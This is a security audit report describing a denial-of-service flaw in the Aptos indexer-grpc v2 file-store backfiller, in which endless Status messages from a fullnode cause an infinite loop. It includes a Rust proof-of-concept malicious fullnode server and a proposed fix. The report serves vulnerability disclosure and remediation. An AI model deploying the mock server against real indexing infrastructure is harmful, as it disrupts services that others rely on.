# Audit Report

## Title
Indexer-gRPC Backfiller Infinite Loop via Malicious Status Response Flooding

## Summary
A malicious fullnode can prevent the indexer-grpc-v2-file-store-backfiller from completing any backfill operation by continuously sending `Response::Status` messages without ever sending transaction data or closing the stream. This causes the backfiller to loop indefinitely at the stream processing logic, never making progress on historical data indexing.

## Finding Description

The backfiller requests transaction data from a fullnode via gRPC streaming and processes responses in a loop. [1](#0-0) 

The protocol expects fullnodes to send a mix of `Response::Status` (for INIT and BATCH_END signals) and `Response::Data` (containing actual transactions). [2](#0-1) 

However, the backfiller silently ignores all Status responses with `continue`, never validating:
1. Whether any transaction data was actually received
2. Whether the expected number of transactions was processed
3. Whether Status messages are legitimate or malicious [3](#0-2) 

A malicious fullnode can exploit this by:
1. Accepting the `GetTransactionsFromNodeRequest` with `transactions_count` parameter
2. Sending an INIT status (expected)
3. Continuously sending BATCH_END or other Status messages indefinitely
4. Never sending any `Response::Data` with transactions
5. Never closing the stream

The backfiller will loop forever at the stream processing loop, with each Status message triggering `continue`, never processing any transactions, and never exiting. The gRPC client has no timeout on stream operations. [4](#0-3) 

In contrast, the cache-worker properly validates Status messages and checks that the expected number of transactions was received. [5](#0-4) 

## Impact Explanation

This qualifies as **High severity** per the "API crashes" category. The backfiller service becomes completely non-functional, unable to complete any backfill operations. While this doesn't impact consensus or validator operations, it represents a significant protocol violation where a malicious fullnode can cause indefinite service disruption to indexing infrastructure that developers and applications rely on for historical data access.

## Likelihood Explanation

**Very High likelihood**. Any operator running a fullnode that the backfiller connects to can trivially exploit this:
- No special privileges required beyond running a fullnode service
- No cryptographic operations needed
- Trivial to implement (just send Status responses in a loop)
- No detection mechanism in place
- No timeout or validation to prevent it

The backfiller explicitly connects to fullnodes via a configured address, making this a direct attack vector with no authentication requirements.

## Recommendation

Add timeout protection and transaction count validation:

```rust
// Add timeout wrapper
const STREAM_TIMEOUT_SECS: u64 = 300; // 5 minutes per batch

// Track received transactions
let mut received_txn_count = 0u64;
let expected_txn_count = num_transactions_per_folder;

while let Some(response_item) = tokio::time::timeout(
    Duration::from_secs(STREAM_TIMEOUT_SECS),
    stream.next()
).await.context("Stream timeout waiting for response")? {
    match response_item {
        Ok(r) => {
            assert!(r.chain_id == chain_id);
            match r.response.unwrap() {
                Response::Data(data) => {
                    let transactions = data.transactions;
                    received_txn_count += transactions.len() as u64;
                    for transaction in transactions {
                        file_store_operator
                            .buffer_and_maybe_dump_transactions_to_file(
                                transaction,
                                tx.clone(),
                            )
                            .await
                            .unwrap();
                    }
                },
                Response::Status(status) => {
                    match StatusType::try_from(status.r#type).unwrap() {
                        StatusType::Init => {
                            info!("Received INIT signal for version {}", status.start_version);
                        },
                        StatusType::BatchEnd => {
                            // Validate we received expected transactions
                            if received_txn_count != expected_txn_count {
                                panic!(
                                    "Batch end received but transaction count mismatch: expected {}, got {}",
                                    expected_txn_count, received_txn_count
                                );
                            }
                            break; // Exit loop after valid batch end
                        },
                        _ => {},
                    }
                },
            }
        },
        Err(e) => {
            panic!("Error when getting transactions from fullnode: {e}.")
        },
    }
}

// Verify we received all expected transactions
if received_txn_count != expected_txn_count {
    panic!(
        "Stream ended prematurely: expected {} transactions, got {}",
        expected_txn_count, received_txn_count
    );
}
```

## Proof of Concept

To demonstrate this vulnerability, create a malicious fullnode mock:

```rust
// malicious_fullnode_mock.rs
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_server::{FullnodeData, FullnodeDataServer},
    transactions_from_node_response::Response,
    GetTransactionsFromNodeRequest, StreamStatus, TransactionsFromNodeResponse,
    stream_status::StatusType,
};
use tonic::{Request, Response as TonicResponse, Status};
use futures::Stream;
use std::pin::Pin;

pub struct MaliciousFullnode;

#[tonic::async_trait]
impl FullnodeData for MaliciousFullnode {
    type GetTransactionsFromNodeStream = 
        Pin<Box<dyn Stream<Item = Result<TransactionsFromNodeResponse, Status>> + Send>>;

    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<TonicResponse<Self::GetTransactionsFromNodeStream>, Status> {
        let req = req.into_inner();
        let starting_version = req.starting_version.unwrap();
        
        let stream = async_stream::stream! {
            // Send INIT
            yield Ok(TransactionsFromNodeResponse {
                response: Some(Response::Status(StreamStatus {
                    r#type: StatusType::Init as i32,
                    start_version: starting_version,
                    end_version: None,
                })),
                chain_id: 1,
            });
            
            // Send infinite BATCH_END messages (never any data)
            loop {
                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                yield Ok(TransactionsFromNodeResponse {
                    response: Some(Response::Status(StreamStatus {
                        r#type: StatusType::BatchEnd as i32,
                        start_version: starting_version,
                        end_version: Some(starting_version + 1000),
                    })),
                    chain_id: 1,
                });
            }
        };
        
        Ok(TonicResponse::new(Box::pin(stream)))
    }
}

// Run this server and point the backfiller to it - it will hang indefinitely
```

Running the backfiller against this malicious fullnode will cause it to loop forever, never processing any transactions, never updating progress, and never completing the backfill operation.

## Notes

This vulnerability is specific to the v2-file-store-backfiller. The cache-worker implementation properly validates Status messages and enforces transaction count expectations, demonstrating the correct pattern that should be applied here. The backfiller's complete lack of validation or timeout protection makes this a straightforward denial-of-service attack vector against the indexing infrastructure.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-v2-file-store-backfiller/src/processor.rs (L173-199)
```rust
                        while let Some(response_item) = stream.next().await {
                            match response_item {
                                Ok(r) => {
                                    assert!(r.chain_id == chain_id);
                                    match r.response.unwrap() {
                                        Response::Data(data) => {
                                            let transactions = data.transactions;
                                            for transaction in transactions {
                                                file_store_operator
                                                    .buffer_and_maybe_dump_transactions_to_file(
                                                        transaction,
                                                        tx.clone(),
                                                    )
                                                    .await
                                                    .unwrap();
                                            }
                                        },
                                        Response::Status(_) => {
                                            continue;
                                        },
                                    }
                                },
                                Err(e) => {
                                    panic!("Error when getting transactions from fullnode: {e}.")
                                },
                            }
                        }
```

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L11-35)
```text
// Transaction data is transferred via 1 stream with batches until terminated.
// One stream consists:
//  StreamStatus: INIT with version x
//  loop k:
//    TransactionOutput data(size n)
//    StreamStatus: BATCH_END with version x + (k + 1) * n - 1

message TransactionsOutput {
  repeated aptos.transaction.v1.Transaction transactions = 1;
}

message StreamStatus {
  enum StatusType {
    STATUS_TYPE_UNSPECIFIED = 0;
    // Signal for the start of the stream.
    STATUS_TYPE_INIT = 1;
    // Signal for the end of the batch.
    STATUS_TYPE_BATCH_END = 2;
  }
  StatusType type = 1;
  // Required. Start version of current batch/stream, inclusive.
  uint64 start_version = 2;
  // End version of current *batch*, inclusive.
  optional uint64 end_version = 3 [jstype = JS_STRING];
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/lib.rs (L36-62)
```rust
pub async fn create_grpc_client(address: Url) -> GrpcClientType {
    backoff::future::retry(backoff::ExponentialBackoff::default(), || async {
        match FullnodeDataClient::connect(address.to_string()).await {
            Ok(client) => {
                tracing::info!(
                    address = address.to_string(),
                    "[Indexer Cache] Connected to indexer gRPC server."
                );
                Ok(client
                    .max_decoding_message_size(usize::MAX)
                    .max_encoding_message_size(usize::MAX)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip)
                    .accept_compressed(CompressionEncoding::Zstd))
            },
            Err(e) => {
                tracing::error!(
                    address = address.to_string(),
                    "[Indexer Cache] Failed to connect to indexer gRPC server: {}",
                    e
                );
                Err(backoff::Error::transient(e))
            },
        }
    })
    .await
    .unwrap()
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L413-443)
```rust
                GrpcDataStatus::BatchEnd {
                    start_version,
                    num_of_transactions,
                } => {
                    // Handle the data multithreading.
                    let result = join_all(tasks_to_run).await;
                    if result
                        .iter()
                        .any(|r| r.is_err() || r.as_ref().unwrap().is_err())
                    {
                        error!(
                            start_version = start_version,
                            num_of_transactions = num_of_transactions,
                            "[Indexer Cache] Process transactions from fullnode failed."
                        );
                        ERROR_COUNT.with_label_values(&["response_error"]).inc();
                        panic!("Error happens when processing transactions from fullnode.");
                    }
                    // Cleanup.
                    tasks_to_run = vec![];
                    if current_version != start_version + num_of_transactions {
                        error!(
                            current_version = current_version,
                            actual_current_version = start_version + num_of_transactions,
                            "[Indexer Cache] End signal received with wrong version."
                        );
                        ERROR_COUNT
                            .with_label_values(&["data_end_wrong_version"])
                            .inc();
                        break;
                    }
```
